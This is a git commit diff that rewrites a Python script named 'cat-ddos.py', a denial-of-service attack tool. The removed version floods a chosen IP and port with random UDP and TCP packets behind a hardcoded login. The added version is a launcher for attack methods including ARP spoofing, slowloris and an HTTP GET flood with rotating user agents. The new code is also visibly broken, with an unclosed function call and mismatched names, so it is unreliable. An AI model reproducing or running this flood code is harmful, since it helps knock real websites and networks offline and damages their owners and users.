ce10f03f2582e0e67ad7f451438ec11bf0ae7019
Abywalidein <mfath6961@gmail.com>
2024-12-12 21:24:13 +0700

    Update cat-ddos.py

--- cat-ddos.py
+++ cat-ddos.py
@@ -1,85 +1,107 @@
 # -*- coding: utf-8 -*-
-import random
-import socket
 import os
 import sys
-import logging
-import threading
 import time
 import fade
+import requests
+import sys
+import threading
+import random
+import re
+import argparse
+import json
+import random
 
-os.system("clear")
-os.system("https://github.com/Kodekeras24")
-print("\033[37mWelcome to Zona Blackphanter\033[0m")
-time.sleep(5)
-print("Loading.......")
+import requests
+from colorama import Fore as F
+from requests.exceptions import Timeout
 
-attemps = 0
-os.system("clear")
-logo = """
-   ÷÷÷ ÷÷        ÷÷÷     ÷÷ ÷÷ ÷÷÷ ÷÷ ÷÷
- ÷÷÷            ÷÷÷ ÷÷         ÷÷÷
-÷÷÷            ÷÷÷   ÷÷        ÷÷÷
-÷÷÷           ÷÷÷     ÷÷       ÷÷÷
-÷÷÷          ÷÷÷       ÷÷      ÷÷÷
- ÷÷÷        ÷÷÷   ÷÷ ÷÷ ÷÷     ÷÷÷
-   ÷÷÷ ÷÷  ÷÷÷           ÷÷    ÷÷÷
-        
-"""
-while attemps < 100:
-    username = input("\033[32mEnter your username: \033[0m")
-    password = input("\033[31mEnter your password: \033[0m")
+os.chdir(os.path.dirname(os.path.realpath(__file__)))
+os.system("cls" if os.name == "nt" else "clear")
 
-    if username == 'hdr' and password == 'hdr':
-        print("\033[32m⟩⟩ Hai...! Welcome to zona attack HUDAIRUL-AQSHA \033[0m")
-        break
+try:
+    from tools.addons.checks import (check_http_target_input,
+                                     check_local_target_input,
+                                     check_method_input, check_number_input)
+    from tools.addons.ip_tools import show_local_host_ips
+    from tools.addons.logo import show_logo
+    from tools.method import AttackMethod
+except (ImportError, NameError) as err:
+    print("\nFailed to import something", err)
+
+
+def main() -> None:
+    """Run main application."""
+    show_logo()
+    try:
+        if (method := check_method_input()) in ["arp-spoof", "disconnect"]:
+            show_local_host_ips()
+        target = (
+            check_http_target_input()
+            if method not in ["arp-spoof", "disconnect"]
+            else check_local_target_input()
+        )
+        threads = (
+            check_number_input("threads")
+            if method not in ["arp-spoof", "disconnect"]
+            else 1
+        )
+        time = check_number_input("time")
+        sleep_time = check_number_input("sleep time") if "slowloris" in method else 0
+
+        with AttackMethod(
+            duration=time,
+            method_name=method,
+            threads=threads,
+            target=target,
+            sleep_time=sleep_time,
+        ) as attack:
+            attack.start()
+    except KeyboardInterrupt:
+        print(
+            f"\n\n{Fore.RED}[!] {Fore.MAGENTA}Ctrl+C detected. Program closed.\n\n{Fore.RESET}"
+        )
+        sys.exit(1)
+
+
+if __name__ == "__main__":
+    main(
+
+with open("tools/L7/user_agents.json", "r") as agents:
+    user_agents = json.load(agents)["agents"]
+
+
+headers = {
+    "X-Requested-With": "XMLHttpRequest",
+    "Connection": "keep-alive",
+    "Pragma": "no-cache",
+    "Cache-Control": "no-cache",
+    "Accept-Encoding": "gzip, deflate, br",
+}
+
+color_code = {True: F.GREEN, False: F.RED}
+
+
+def flood(target: str) -> None:
+    """Start an HTTP GET request flood.
+
+    Args:
+        - target - Target's URL
+
+    Returns:
+        None
+    """
+    global headers
+
+    headers["User-agent"] = random.choice(user_agents)
+
+    try:
+        response = requests.get(target, headers=headers, timeout=4)
+    except (Timeout, OSError):
+        return
     else:
-        print('Incorrect credentials. Check if you have Caps lock on and try again.')
-        attemps += 1
-        continue
-
-ip = str(input("\033[95m Target IP :\033[0m"))
-port = int(input("\033[94m Target Port :\033[0m"))
-times = int(input("\033[33m Time :\033[0m"))
-threads = int(input("\033[37m Threads :\033[0m"))
-
-time.sleep(5),
-print("\033[33m  ⟩⟩  Get ready to attack....!!! \033[0m "),
-
-def run():
-	data = random._urandom(1024)
-	i = random.choice(("[+]","[*]","[!]"))
-	while True:
-		try:
-			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-			addr = (str(ip),int(port))
-			for x in range(times):
-				s.sendto(data,addr)
-			print("[+]  \033[32mTCP  \033[33mנפגע על ידי סערה מדברית\033[0m    " +ip+ "")
-			print("\033[35m—————————————————————————————————————————————————💥\033[0m")
-		except:
-			print("[!]  \033[31mMay be down\033[0m")
-
-def run2():
-	data = random._urandom(999)
-	i = random.choice(("[+]","[*]","[!]"))
-	while True:
-		try:
-			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-			s.connect((ip,port))
-			s.send(data)
-			for x in range(times):
-				s.send(data)
-			print("[*]  \033[96mUDP  \033[92mBlackPhanter-\033[95mattack Sent   \033[33m" +ip+ "\033[0m")
-			print("\033[36m—————————————————————————————————————————————————💥\033[0m")
-		except:
-			s.close()
-			print("[!]  \033[31mMay be down\033[0m")
-
-
-
-			
-for x in range(threads):
-	        th = threading.Thread(target = run)
-	        th = threading.Thread(target = run2)
-		
+        status = (
+            f"{color_code[response.status_code == 200]}Status: [{response.status_code}]"
+        )
+        payload_size = f"{F.RESET} Requested Data Size: {F.CYAN}{round(len(response.content)/1024, 2):>6} KB"
+        print(f"{status}{F.RESET} --> {payload_size} {F.RESET}")
